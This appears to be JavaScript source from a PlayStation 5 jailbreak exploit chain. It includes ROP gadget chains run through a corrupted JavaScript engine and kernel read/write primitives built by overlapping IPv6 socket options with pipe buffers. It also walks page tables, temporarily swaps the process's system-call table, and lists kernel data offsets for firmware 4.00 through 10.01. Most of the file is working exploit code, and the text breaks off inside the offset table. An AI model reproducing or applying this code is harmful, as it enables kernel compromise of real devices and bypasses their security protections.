FW_VERSION = "";

PAGE_SIZE = 0x4000;
PHYS_PAGE_SIZE = 0x1000;

LIBKERNEL_HANDLE = 0x2001n;

MAIN_CORE = 4;
MAIN_RTPRIO = 0x100;
NUM_WORKERS = 2;
NUM_GROOMS = 0x200;
NUM_HANDLES = 0x100;
NUM_SDS = 64;
NUM_SDS_ALT = 48;
NUM_RACES = 100;
NUM_ALIAS = 100;
LEAK_LEN = 16;
NUM_LEAKS = 16;
NUM_CLOBBERS = 8;
MAX_AIO_IDS = 0x80;

AIO_CMD_READ = 1n;
AIO_CMD_FLAG_MULTI = 0x1000n;
AIO_CMD_MULTI_READ = 0x1001n;
AIO_CMD_WRITE = 2n;
AIO_STATE_COMPLETE = 3n;
AIO_STATE_ABORTED = 4n;        

SCE_KERNEL_ERROR_ESRCH = 0x80020003n;

RTP_SET = 1n;
PRI_REALTIME = 2n;

block_fd = 0xffffffffffffffffn;
unblock_fd = 0xffffffffffffffffn;
block_id = -1n;
groom_ids = null;
sds = null;
sds_alt = null;
prev_core = -1;
prev_rtprio = 0n;
ready_signal = 0n;
deletion_signal = 0n;
pipe_buf = 0n;

saved_fpu_ctrl = 0;
saved_mxcsr = 0;

function sysctlbyname(name, oldp, oldp_len, newp, newp_len) {
    const translate_name_mib = malloc(0x8);
    const buf_size = 0x70;
    const mib = malloc(buf_size);
    const size = malloc(0x8);
    
    write64_uncompressed(translate_name_mib, 0x300000000n);
    write64_uncompressed(size, BigInt(buf_size));
    
    const name_addr = alloc_string(name);
    const name_len = BigInt(name.length);
    
    if (syscall(SYSCALL.sysctl, translate_name_mib, 2n, mib, size, name_addr, name_len) === 0xffffffffffffffffn) {
        throw new Error("failed to translate sysctl name to mib (" + name + ")");
    }
    
    if (syscall(SYSCALL.sysctl, mib, 2n, oldp, oldp_len, newp, newp_len) === 0xffffffffffffffffn) {
        return false;
    }
    
    return true;
}

/***** misc.js *****/
function find_pattern(buffer, pattern_string) {
    const parts = pattern_string.split(' ');
    const matches = [];
    
    for (let i = 0; i <= buffer.length - parts.length; i++) {
        let match = true;
        
        for (let j = 0; j < parts.length; j++) {
            if (parts[j] === '?') continue;
            if (buffer[i + j] !== parseInt(parts[j], 16)) {
                match = false;
                break;
            }
        }
        
        if (match) matches.push(i);
    }
    
    return matches;
}

function get_fwversion() {
    const buf = malloc(0x8);
    const size = malloc(0x8);
    write64_uncompressed(size, 0x8n);
    
    if (sysctlbyname("kern.sdk_version", buf, size, 0n, 0n)) {
        const byte1 = Number(read8_uncompressed(buf + 2n));  // Minor version (first byte)
        const byte2 = Number(read8_uncompressed(buf + 3n));  // Major version (second byte)
        
        const version = byte2.toString(16) + '.' + byte1.toString(16).padStart(2, '0');
        return version;
    }
    
    return null;
}

function call_pipe_rop(fildes) {

    write64(add_rop_smash_code_store, 0xab0025n);
    real_rbp = addrof(rop_smash(1)) + 0x700000000n -1n +2n;

    let rop_i = 0;
    
    fake_rop[rop_i++] = g.get('pop_rax'); // pop rax ; ret
    fake_rop[rop_i++] = SYSCALL.pipe;
    fake_rop[rop_i++] = syscall_wrapper;
    
    // Store rax (read_fd) to fildes[0]
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = fildes;
    fake_rop[rop_i++] = g.get('mov_qword_ptr_rdi_rax'); // mov qword [rdi], rax ; ret
    
    // Store rdx (write_fd) to fildes[4]
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = fildes + 4n;
    fake_rop[rop_i++] = g.get('mov_qword_ptr_rdi_rdx'); // mov qword [rdi], rdx ; ret
    
    // Return safe tagged value to JavaScript
    fake_rop[rop_i++] = g.get('pop_rax'); // mov rax, 0x200000000 ; ret
    fake_rop[rop_i++] = 0x2000n;                   // Fake value in RAX to make JS happy
    fake_rop[rop_i++] = g.get('pop_rsp_pop_rbp');
    fake_rop[rop_i++] = real_rbp;
    
    write64(add_rop_smash_code_store, 0xab00260325n);
    oob_arr[39] = base_heap_add + fake_frame;
    return rop_smash(obj_arr[0]);          // Call ROP
}

function create_pipe() {
    const fildes = malloc(0x10);
    
    call_pipe_rop(fildes);
    
    const read_fd = read32_uncompressed(fildes);
    const write_fd = read32_uncompressed(fildes + 4n);
    //logger.log("This are the created pipes: " + hex(read_fd) + " " + hex(write_fd));
    return [read_fd, write_fd];
}

function read_buffer(addr, len) {
    const buffer = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
        buffer[i] = Number(read8_uncompressed(addr + BigInt(i)));
    }
    return buffer;
}

function write_buffer(addr, buffer) {
    for (let i = 0; i < buffer.length; i++) {
        write8_uncompressed(addr + BigInt(i), buffer[i]);
    }
}

function read_cstring (add) {
    let str = '';
    let byte;

    while (true) {
        try {
            byte = read8_uncompressed(add);
        } catch (e) {
            logger.log("read_cstring error reading memory at address " + hex(add) + ", e.message");
            break; 
        }
        if (byte === 0n) {
            break;
        }
        str += String.fromCharCode(Number(byte));
        add++;
    }
    return str;
}

function get_nidpath() {
    const path_buffer = malloc(0x255);
    const len_ptr = malloc(8);
    
    write64_uncompressed(len_ptr, 0x255n);
    
    const ret = syscall(SYSCALL.randomized_path, 0n, path_buffer, len_ptr);
    if (ret === 0xffffffffffffffffn) {
        throw new Error("randomized_path failed : " + hex(ret));        
    }
    
    return read_cstring(path_buffer);
}

function nanosleep(nsec) {
    const timespec = malloc(0x10);
    write64_uncompressed(timespec, BigInt(Math.floor(nsec / 1e9)));    // tv_sec
    write64_uncompressed(timespec + 8n, BigInt(nsec % 1e9));           // tv_nsec
    syscall(SYSCALL.nanosleep, timespec);
}

function is_jailbroken() {
    const cur_uid = syscall(SYSCALL.getuid);
    const is_in_sandbox = syscall(SYSCALL.is_in_sandbox);
    if (cur_uid === 0n && is_in_sandbox === 0n) {
        return true;
    } else {
        
        // Check if elfldr is running at 9021
        const sockaddr_in = malloc(16);
        const enable = malloc(4);
        
        const sock_fd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
        if (sock_fd === 0xffffffffffffffffn) {
            throw new Error("socket failed: " + hex(sock_fd));
        }
    
        try {
            write32_uncompressed(enable, 1);
            syscall(SYSCALL.setsockopt, sock_fd, SOL_SOCKET, SO_REUSEADDR, enable, 4n);
    
            write8_uncompressed(sockaddr_in + 1n, AF_INET);
            write16_uncompressed(sockaddr_in + 2n, 0x3D23n);      // port 9021
            write32_uncompressed(sockaddr_in + 4n, 0x0100007Fn);  // 127.0.0.1
    
            // Try to connect to 127.0.0.1:9021
            const ret = syscall(SYSCALL.connect, sock_fd, sockaddr_in, 16n);
    
            if (ret === 0n) {
                syscall(SYSCALL.close, sock_fd);
                return true;
            } else {
                syscall(SYSCALL.close, sock_fd);
                return false;
            }
        } catch (e) {
            syscall(SYSCALL.close, sock_fd);
            return false;
        }
    }
}

function check_jailbroken() {
    if (!is_jailbroken()) {
        throw new Error("process is not jailbroken")
    }
}

function file_exists(path) {
    const path_addr = alloc_string(path);
    const fd = syscall(SYSCALL.open, path_addr, O_RDONLY);
    
    if (fd !== 0xffffffffffffffffn) {
        syscall(SYSCALL.close, fd);
        return true;
    } else {
        return false;
    }
}

function write_file(path, text) {
    const mode = 0x1ffn; // 777
    const path_addr = alloc_string(path);
    const data_addr = alloc_string(text);

    const flags = O_CREAT | O_WRONLY | O_TRUNC;
    const fd = syscall(SYSCALL.open, path_addr, flags, mode);

    if (fd === 0xffffffffffffffffn) {
        throw new Error("open failed for " + path + " fd: " + hex(fd));
    }
    
    const written = syscall(SYSCALL.write, fd, data_addr, BigInt(text.length));
    if (written === 0xffffffffffffffffn) {
        syscall(SYSCALL.close, fd);
        throw new Error("write failed : " + hex(written));
    }

    syscall(SYSCALL.close, fd);
    return Number(written); // number of bytes written
}
/***** kernel.js *****/
kernel = {
    addr: {},
    copyout: null,
    copyin: null,
    read_buffer: null,
    write_buffer: null
};

kernel.read_byte = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 1);
    return value && value.length === 1 ? BigInt(value[0]) : null;
};

kernel.read_word = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 2);
    if (!value || value.length !== 2) return null;
    return BigInt(value[0]) | (BigInt(value[1]) << 8n);
};

kernel.read_dword = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 4);
    if (!value || value.length !== 4) return null;
    let result = 0n;
    for (let i = 0; i < 4; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

kernel.read_qword = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 8);
    if (!value || value.length !== 8) return null;
    let result = 0n;
    for (let i = 0; i < 8; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

kernel.read_null_terminated_string = function(kaddr) {
    //const decoder = new TextDecoder('utf-8');
    let result = "";
    
    while (true) {
        const chunk = kernel.read_buffer(kaddr, 0x8);
        if (!chunk || chunk.length === 0) break;
        
        let null_pos = -1;
        for (let i = 0; i < chunk.length; i++) {
            if (chunk[i] === 0) {
                null_pos = i;
                break;
            }
        }
        
        if (null_pos >= 0) {
            if (null_pos > 0) {
                for(let i = 0; i < null_pos; i++)
                {
                    result += String.fromCharCode(Number(chunk[i]));
                }
            }
            return result;
        }
        
        for(let i = 0; i < chunk.length; i++)
        {
            result += String.fromCharCode(Number(chunk[i]));
        }

        kaddr = kaddr + BigInt(chunk.length);
    }
    
    return result;
};

kernel.write_byte = function(dest, value) {
    const buf = new Uint8Array(1);
    buf[0] = Number(value & 0xFFn);
    kernel.write_buffer(dest, buf);
};

kernel.write_word = function(dest, value) {
    const buf = new Uint8Array(2);
    buf[0] = Number(value & 0xFFn);
    buf[1] = Number((value >> 8n) & 0xFFn);
    kernel.write_buffer(dest, buf);
};

kernel.write_dword = function(dest, value) {
    const buf = new Uint8Array(4);
    for (let i = 0; i < 4; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    kernel.write_buffer(dest, buf);
};

kernel.write_qword = function(dest, value) {
    const buf = new Uint8Array(8);
    for (let i = 0; i < 8; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    kernel.write_buffer(dest, buf);
};

ipv6_kernel_rw = {
    data: {},
    ofiles: null,
    kread8: null,
    kwrite8: null
};

ipv6_kernel_rw.init = function(ofiles, kread8, kwrite8) {
    ipv6_kernel_rw.ofiles = ofiles;
    ipv6_kernel_rw.kread8 = kread8;
    ipv6_kernel_rw.kwrite8 = kwrite8;
    
    ipv6_kernel_rw.create_pipe_pair();
    ipv6_kernel_rw.create_overlapped_ipv6_sockets();
};

ipv6_kernel_rw.get_fd_data_addr = function(fd) {
    const filedescent_addr = ipv6_kernel_rw.ofiles + BigInt(fd) * kernel_offset.SIZEOF_OFILES;
    const file_addr = ipv6_kernel_rw.kread8(filedescent_addr + 0x0n);
    return ipv6_kernel_rw.kread8(file_addr + 0x0n);
};

ipv6_kernel_rw.create_pipe_pair = function() {
    const [read_fd, write_fd] = create_pipe();
    
    ipv6_kernel_rw.data.pipe_read_fd = read_fd;
    ipv6_kernel_rw.data.pipe_write_fd = write_fd;
    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd);
    ipv6_kernel_rw.data.pipemap_buffer = malloc(0x14);
    ipv6_kernel_rw.data.read_mem = malloc(PAGE_SIZE);
};

ipv6_kernel_rw.create_overlapped_ipv6_sockets = function() {
    const master_target_buffer = malloc(0x14);
    const slave_buffer = malloc(0x14);
    const pktinfo_size_store = malloc(0x8);
    
    write64_uncompressed(pktinfo_size_store, 0x14n);
    
    const master_sock = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    const victim_sock = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    
    syscall(SYSCALL.setsockopt, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14n);
    syscall(SYSCALL.setsockopt, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14n);
    
    const master_so = ipv6_kernel_rw.get_fd_data_addr(master_sock);
    const master_pcb = ipv6_kernel_rw.kread8(master_so + kernel_offset.SO_PCB);
    const master_pktopts = ipv6_kernel_rw.kread8(master_pcb + kernel_offset.INPCB_PKTOPTS);
    
    const slave_so = ipv6_kernel_rw.get_fd_data_addr(victim_sock);
    const slave_pcb = ipv6_kernel_rw.kread8(slave_so + kernel_offset.SO_PCB);
    const slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb + kernel_offset.INPCB_PKTOPTS);
    
    ipv6_kernel_rw.kwrite8(master_pktopts + 0x10n, slave_pktopts + 0x10n);
    
    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer;
    ipv6_kernel_rw.data.slave_buffer = slave_buffer;
    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store;
    ipv6_kernel_rw.data.master_sock = master_sock;
    ipv6_kernel_rw.data.victim_sock = victim_sock;
};

ipv6_kernel_rw.ipv6_write_to_victim = function(kaddr) {
    write64_uncompressed(ipv6_kernel_rw.data.master_target_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.master_target_buffer + 0x8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.master_target_buffer + 0x10n, 0n);
    syscall(SYSCALL.setsockopt, ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6, 
            IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14n);
};

ipv6_kernel_rw.ipv6_kread = function(kaddr, buffer_addr) {
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    syscall(SYSCALL.getsockopt, ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, 
            IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store);
};

ipv6_kernel_rw.ipv6_kwrite = function(kaddr, buffer_addr) {
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    syscall(SYSCALL.setsockopt, ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, 
            IPV6_PKTINFO, buffer_addr, 0x14n);
};

ipv6_kernel_rw.ipv6_kread8 = function(kaddr) {
    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer);
    return read64_uncompressed(ipv6_kernel_rw.data.slave_buffer);
};

ipv6_kernel_rw.copyout = function(kaddr, uaddr, len) {
   if (kaddr === null || kaddr === undefined || 
       uaddr === null || uaddr === undefined || 
       len === null || len === undefined || len === 0n) {
       throw new Error("copyout: invalid arguments");
   }
    
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, 0x4000000040000000n);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0x4000000000000000n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);
    
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10n, ipv6_kernel_rw.data.pipemap_buffer);
    
    syscall(SYSCALL.read, ipv6_kernel_rw.data.pipe_read_fd, uaddr, len);
};

ipv6_kernel_rw.copyin = function(uaddr, kaddr, len) {
   if (kaddr === null || kaddr === undefined || 
       uaddr === null || uaddr === undefined || 
       len === null || len === undefined || len === 0n) {
       throw new Error("copyout: invalid arguments");
   }
    
    
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, 0n);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0x4000000000000000n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);
    
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10n, ipv6_kernel_rw.data.pipemap_buffer);
    
    syscall(SYSCALL.write, ipv6_kernel_rw.data.pipe_write_fd, uaddr, len);
};

ipv6_kernel_rw.read_buffer = function(kaddr, len) {
    let mem = ipv6_kernel_rw.data.read_mem;
    if (len > PAGE_SIZE) {
        mem = malloc(len);
    }
    
    ipv6_kernel_rw.copyout(kaddr, mem, BigInt(len));
    return read_buffer(mem, len);
};

ipv6_kernel_rw.write_buffer = function(kaddr, buf) {
    const temp_addr = malloc(buf.length);
    write_buffer(temp_addr, buf);
    ipv6_kernel_rw.copyin(temp_addr, kaddr, BigInt(buf.length));
};

// CPU page table definitions
CPU_PDE_SHIFT = {
    PRESENT: 0,
    RW: 1,
    USER: 2,
    WRITE_THROUGH: 3,
    CACHE_DISABLE: 4,
    ACCESSED: 5,
    DIRTY: 6,
    PS: 7,
    GLOBAL: 8,
    XOTEXT: 58,
    PROTECTION_KEY: 59,
    EXECUTE_DISABLE: 63
};

CPU_PDE_MASKS = {
    PRESENT: 1n,
    RW: 1n,
    USER: 1n,
    WRITE_THROUGH: 1n,
    CACHE_DISABLE: 1n,
    ACCESSED: 1n,
    DIRTY: 1n,
    PS: 1n,
    GLOBAL: 1n,
    XOTEXT: 1n,
    PROTECTION_KEY: 0xfn,
    EXECUTE_DISABLE: 1n
};

CPU_PG_PHYS_FRAME = 0x000ffffffffff000n;
CPU_PG_PS_FRAME = 0x000fffffffe00000n;

function cpu_pde_field(pde, field) {
    const shift = CPU_PDE_SHIFT[field];
    const mask = CPU_PDE_MASKS[field];
    return Number((pde >> BigInt(shift)) & mask);
}

function cpu_walk_pt(cr3, vaddr) {
    if (!vaddr || !cr3) {
        throw new Error("cpu_walk_pt: invalid arguments");
    }
    
    const pml4e_index = (vaddr >> 39n) & 0x1ffn;
    const pdpe_index = (vaddr >> 30n) & 0x1ffn;
    const pde_index = (vaddr >> 21n) & 0x1ffn;
    const pte_index = (vaddr >> 12n) & 0x1ffn;
    
    const pml4e = kernel.read_qword(phys_to_dmap(cr3) + pml4e_index * 8n);
    if (cpu_pde_field(pml4e, "PRESENT") !== 1) {
        return null;
    }
    
    const pdp_base_pa = pml4e & CPU_PG_PHYS_FRAME;
    const pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8n;
    const pdpe = kernel.read_qword(pdpe_va);
    
    if (cpu_pde_field(pdpe, "PRESENT") !== 1) {
        return null;
    }
    
    const pd_base_pa = pdpe & CPU_PG_PHYS_FRAME;
    const pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8n;
    const pde = kernel.read_qword(pde_va);
    
    if (cpu_pde_field(pde, "PRESENT") !== 1) {
        return null;
    }
    
    if (cpu_pde_field(pde, "PS") === 1) {
        return (pde & CPU_PG_PS_FRAME) | (vaddr & 0x1fffffn);
    }
    
    const pt_base_pa = pde & CPU_PG_PHYS_FRAME;
    const pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
    const pte = kernel.read_qword(pte_va);
    
    if (cpu_pde_field(pte, "PRESENT") !== 1) {
        return null;
    }
    
    return (pte & CPU_PG_PHYS_FRAME) | (vaddr & 0x3fffn);
}

function is_kernel_rw_available() {
    return kernel.read_buffer && kernel.write_buffer;
}

function check_kernel_rw() {
    if (!is_kernel_rw_available()) {
        throw new Error("kernel r/w is not available");
    }
}

function find_proc_by_name(name) {
    check_kernel_rw();
    if (!kernel.addr.allproc) {
        throw new Error("kernel.addr.allproc not set");
    }
    
    let proc = kernel.read_qword(kernel.addr.allproc);
    while (proc !== 0n) {
        const proc_name = kernel.read_null_terminated_string(proc + kernel_offset.PROC_COMM);
        if (proc_name === name) {
            return proc;
        }
        proc = kernel.read_qword(proc + 0x0n);
    }
    
    return null;
}

function find_proc_by_pid(pid) {
    check_kernel_rw();
    if (!kernel.addr.allproc) {
        throw new Error("kernel.addr.allproc not set");
    }
    
    const target_pid = BigInt(pid);
    let proc = kernel.read_qword(kernel.addr.allproc);
    while (proc !== 0n) {
        const proc_pid = kernel.read_dword(proc + kernel_offset.PROC_PID);
        if (proc_pid === target_pid) {
            return proc;
        }
        proc = kernel.read_qword(proc + 0x0n);
    }
    
    return null;
}

function get_proc_cr3(proc) {
    check_kernel_rw();
    
    const vmspace = kernel.read_qword(proc + kernel_offset.PROC_VM_SPACE);
    const pmap_store = kernel.read_qword(vmspace + kernel_offset.VMSPACE_VM_PMAP);
    
    return kernel.read_qword(pmap_store + kernel_offset.PMAP_CR3);
}

function virt_to_phys(virt_addr, cr3) {
    check_kernel_rw();
    if (!kernel.addr.dmap_base || !virt_addr) {
        throw new Error("virt_to_phys: invalid arguments");
    }
    
    cr3 = cr3 || kernel.addr.kernel_cr3;
    return cpu_walk_pt(cr3, virt_addr);
}

function phys_to_dmap(phys_addr) {
    if (!kernel.addr.dmap_base || !phys_addr) {
        throw new Error("phys_to_dmap: invalid arguments");
    }
    return kernel.addr.dmap_base + phys_addr;
}

// Replace curproc sysent with sysent of other PS5 process
// Note: failure to restore curproc sysent will have side effect on the game/PS
function run_with_ps5_syscall_enabled(f) {
    check_kernel_rw();
    
    const target_proc_name = "SceGameLiveStreaming"; // arbitrarily chosen PS5 process
    
    const target_proc = find_proc_by_name(target_proc_name);
    if (!target_proc) {
        throw new Error("failed to find proc addr of " + target_proc_name);
    }
    
    const cur_sysent = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_SYSENT);  // struct sysentvec
    const target_sysent = kernel.read_qword(target_proc + kernel_offset.PROC_SYSENT);
    
    const cur_table_size = kernel.read_dword(cur_sysent); // sv_size
    const target_table_size = kernel.read_dword(target_sysent);
    
    const cur_table = kernel.read_qword(cur_sysent + 0x8n); // sv_table
    const target_table = kernel.read_qword(target_sysent + 0x8n);
    
    // Replace with target sysent
    kernel.write_dword(cur_sysent, target_table_size);
    kernel.write_qword(cur_sysent + 0x8n, target_table);
    
    try {
        f();
    } catch (e) {
        logger.log('run_with_ps5_syscall_enabled failed : ' + e.message);
        logger.log(e.stack);
    } finally {
        // Always restore back
        kernel.write_dword(cur_sysent, cur_table_size);
        kernel.write_qword(cur_sysent + 0x8n, cur_table);
    }
}

/***** kernel_offset.js *****/
offset_4_00_to_4_51 = {
    DATA_BASE: 0x0C00000n,
    DATA_SIZE: 0x087B1930n,
    DATA_BASE_DYNAMIC: 0x00010000n,
    DATA_BASE_TO_DYNAMIC: 0x0670DB90n,
    DATA_BASE_ALLPROC: 0x027EDCB8n,
    DATA_BASE_SECURITY_FLAGS: 0x06506474n,
    DATA_BASE_ROOTVNODE: 0x066E74C0n,
    DATA_BASE_KERNEL_PMAP_STORE: 0x03257A78n,
    DATA_BASE_DATA_CAVE: 0x06C01000n,  // Unconfirmed
    DATA_BASE_GVMSPACE: 0x064C3F80n,
    PMAP_STORE_PML4PML4I: -0x1Cn,
    PMAP_STORE_DMPML4I: 0x288n,
    PMAP_STORE_DMPDPI: 0x28Cn,
};

offset_5_00_to_5_10 = {
    DATA_BASE: 0x0C40000n,
    DATA_SIZE: 0x08921930n,
    DATA_BASE_DYNAMIC: 0x00010000n,
    DATA_BASE_TO_DYNAMIC: 0x06879C00n,
    DATA_BASE_ALLPROC: 0x0291DD00n,
    DATA_BASE_SECURITY_FLAGS: 0x066466ECn,
    DATA_BASE_ROOTVNODE: 0x06853510n,
    DATA_BASE_KERNEL_PMAP_STORE: 0x03398A88n,
    DATA_BASE_DATA_CAVE: 0x06320000n,  // Unconfirmed
    DATA_BASE_GVMSPACE: 0x06603FB0n,
    PMAP_STORE_PML4PML4I: -0x105Cn,
    PMAP_STORE_DMPML4I: 0x29Cn,
    PMAP_STORE_DMPDPI: 0x2A0n,
};

offset_5_50 = {
    DATA_BASE: 0x0C40000n,
    DATA_SIZE: 0x08921930n,
    DATA_BASE_DYNAMIC: 0x00010000n,
    DATA_BASE_TO_DYNAMIC: 0x06879C00n,
    DATA_BASE_ALLPROC: 0x0291DD00n,
    DATA_BASE_SECURITY_FLAGS: 0x066466ECn,
    DATA_BASE_ROOTVNODE: 0x06853510n,
    DATA_BASE_KERNEL_PMAP_STORE: 0x03394A88n,
    DATA_BASE_DATA_CAVE: 0x06320000n,  // Unconfirmed
    DATA_BASE_GVMSPACE: 0x06603FB0n,
    PMAP_STORE_PML4PML4I: -0x105Cn,
    PMAP_STORE_DMPML4I: 0x29Cn,
    PMAP_STORE_DMPDPI: 0x2A0n,
};

offset_6_00_to_6_50 = {
    DATA_BASE: 0x0C60000n,  // Unconfirmed
    DATA_SIZE: 0x08861930n,
    DATA_BASE_DYNAMIC: 0x00010000n,
    DATA_BASE_TO_DYNAMIC: 0x067C5C10n,
    DATA_BASE_ALLPROC: 0x02869D20n,
    DATA_BASE_SECURITY_FLAGS: 0x065968ECn,
    DATA_BASE_ROOTVNODE: 0x0679F510n,
    DATA_BASE_KERNEL_PMAP_STORE: 0x032E4358n,
    DATA_BASE_DATA_CAVE: 0x06270000n,  // Unconfirmed
    DATA_BASE_GVMSPACE: 0x065540F0n,
    PMAP_STORE_PML4PML4I: -0x105Cn,
    PMAP_STORE_DMPML4I: 0x29Cn,
    PMAP_STORE_DMPDPI: 0x2A0n,
};

offset_7_00_to_7_61 = {
    DATA_BASE: 0x0C50000n,
    DATA_SIZE: 0x05191930n,
    DATA_BASE_DYNAMIC: 0x00010000n,
    DATA_BASE_TO_DYNAMIC: 0x030EDC40n,
    DATA_BASE_ALLPROC: 0x02859D50n,
    DATA_BASE_SECURITY_FLAGS: 0x00AC8064n,
    DATA_BASE_ROOTVNODE: 0x030C7510n,
    DATA_BASE_KERNEL_PMAP_STORE: 0x02E2C848n,
    DATA_BASE_DATA_CAVE: 0x050A1000n,  // Unconfirmed
    DATA_BASE_GVMSPACE: 0x02E76090n,
    PMAP_STORE_PML4PML4I: -0x10ACn,
    PMAP_STORE_DMPML4I: 0x29Cn,
    PMAP_STORE_DMPDPI: 0x2A0n,
};

offset_8_00_to_8_60 = {
    DATA_BASE: 0xC70000n,
    DATA_SIZE: null,
    DATA_BASE_DYNAMIC: 0x10000n,
    DATA_BASE_TO_DYNAMIC: null,
    DATA_BASE_ALLPROC: 0x2875D50n,
    DATA_BASE_SECURITY_FLAGS: 0xAC3064n,
    DATA_BASE_ROOTVNODE: 0x30FB510n,
    DATA_BASE_KERNEL_PMAP_STORE: 0x2E48848n,
    DATA_BASE_DATA_CAVE: null,
    DATA_BASE_GVMSPACE: 0x2EAA090n,
    PMAP_STORE_PML4PML4I: null,
    PMAP_STORE_DMPML4I: null,
    PMAP_STORE_DMPDPI: null,
};

offset_9_00 = {
    DATA_BASE: 0xCA0000n,
    DATA_SIZE: null,
    DATA_BASE_DYNAMIC: 0x10000n,
    DATA_BASE_TO_DYNAMIC: null,
    DATA_BASE_ALLPROC: 0x2755D50n,
    DATA_BASE_SECURITY_FLAGS: 0xD72064n,
    DATA_BASE_ROOTVNODE: 0x2FDB510n,
    DATA_BASE_KERNEL_PMAP_STORE: 0x2D28B78n,
    DATA_BASE_DATA_CAVE: null,
    DATA_BASE_GVMSPACE: 0x2D8A570n,
    PMAP_STORE_PML4PML4I: null,
    PMAP_STORE_DMPML4I: null,
    PMAP_STORE_DMPDPI: null,
};

offset_9_05_to_9_60 = {
    DATA_BASE: 0xCA0000n,
    DATA_SIZE: null,
    DATA_BASE_DYNAMIC: 0x10000n,
    DATA_BASE_TO_DYNAMIC: null,
    DATA_BASE_ALLPROC: 0x2755D50n,
    DATA_BASE_SECURITY_FLAGS: 0xD73064n,
    DATA_BASE_ROOTVNODE: 0x2FDB510n,
    DATA_BASE_KERNEL_PMAP_STORE: 0x2D28B78n,
    DATA_BASE_DATA_CAVE: null,
    DATA_BASE_GVMSPACE: 0x2D8A570n,
    PMAP_STORE_PML4PML4I: null,
    PMAP_STORE_DMPML4I: null,
    PMAP_STORE_DMPDPI: null,
};

offset_10_00_to_10_01 = {
    DATA_BASE: 0xCC0000n,
    DATA_SIZE: null,
    DATA_BASE_DYNAMIC: 0x10000n,
    DATA_BASE_TO_DYNAMIC: null,
    DATA_BASE_ALLPROC: 0x2765D70n,
    DATA_BASE_SECURITY_FLAGS: 0xD79064n,
    DATA_BASE_ROOTVNODE: 0x2FA3510n,
    DATA_BASE_KERNEL_PMAP_STORE: 0x2CF0EF8n,
    DATA_BASE_DATA_CAVE: null,
    DATA_BASE_GVMSPACE: 0x2D52570n,
    PMAP_STORE_PML4PML4I: null,
    PMAP_STORE_DMPML4I: null,
    PMAP_STORE_DMPDPI: null,
};

// Map firmware versions to shared offset objects
ps5_kernel_offset_list = {
    "4.00": offset_4_00_to_4_51,
    "4.02": offset_4_00_to_4_51,
    "4.03": offset_4_00_to_4_51,
    "4.50": offset_4_00_to_4_51,
    "4.51": offset_4_00_to_4_51,
    "5.00": offset_5_00_to_5_10,
    "5.02": offset_5_00_to_5_10,
    "5.10": offset_5_00_to_5_10,
    "5.50": offset_5_50,
    "6.00": offset_6_00_to_6_50,
    "6.02": offset_6_00_to_6_50,
    "6.50": offset_6_00_to_6_50,
    "7.00": offset_7_00_to_7_61,
    "7.01": offset_7_00_to_7_61,
    "7.20": offset_7_00_to_7_61,
    "7.40": offset_7_00_to_7_61,
    "7.60": offset_7_00_to_7_61,
    "7.61": offset_7_00_to_7_61,
